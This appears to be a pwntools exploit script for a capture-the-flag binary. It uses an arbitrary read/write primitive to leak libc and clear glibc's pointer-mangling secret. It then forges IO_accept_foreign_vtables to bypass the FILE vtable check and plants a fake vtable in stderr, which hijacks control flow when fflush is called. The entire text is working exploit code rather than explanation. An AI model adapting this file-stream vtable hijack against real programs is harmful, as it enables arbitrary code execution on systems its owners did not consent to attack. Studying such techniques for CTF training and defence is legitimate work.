from pwn import *

gdbscript = """
b *main
c
"""

io = gdb.debug("./main",gdbscript=gdbscript)
#io = process("./main")

def read(address):
    io.recvuntil(b'?')
    io.sendline(b'1')
    io.recvuntil(b'Where?')
    io.sendline(f"{address}".encode())
    io.recvuntil(b'Your leak: ')
    leak = io.recvline()[:-1]
    return int(leak,16)

def write(address, what):
    io.recvuntil(b'?')
    io.sendline(b'2')
    io.recvuntil(b'Where?')
    io.sendline(f"{address}".encode())
    io.recvuntil(b'What?')
    io.sendline(f"{what}".encode())

def fflush():
    io.recvuntil(b'?')
    io.sendline(b'3')

puts_leak = read(0x404018)
libc_base = puts_leak - 0x80ed0

log.info(f"LIBC BASE: {libc_base:#x}")

#rol shamelessly stolen from https://gist.github.com/trietptm/5cd60ed6add5adad6a34098ce255949a
rol = lambda val, r_bits, max_bits: \
(val << r_bits%max_bits) & (2**max_bits-1) | \
((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

#Overwrite the mangle secret
mangle_secret = write(libc_base-0x2890,0x0)

#Calculate the offsets
IO_accept_foreign_vtables = libc_base+0x21ba28
IO_vtable_check = libc_base+0x89f70

#Mangle the pointer and store it
write(IO_accept_foreign_vtables,rol(IO_vtable_check,0x11,64))

#Now we make a fake vtable and replace it in stderr, then trigger a call to it
stderr = libc_base+0x21a6a0

def make_fake_vtable(address):
    unreachable_addr = 0x4011f6

    #First two entries in a vtable are always 0
    for i in range(0,2):
        write(address,0x0)
        address+=8
    
    #Just fill the vtable with pointers to unreachable.
    for i in range(0,19):
        write(address,unreachable_addr)
        address+=8

make_fake_vtable(0x404800)
#Change the pointer to our vtable in stderr
write(stderr+216, 0x404800)
#Make sure it triggers a check in the vtable
write(stderr,0xfbad1800)
input()
#Trigger it
fflush()

io.interactive()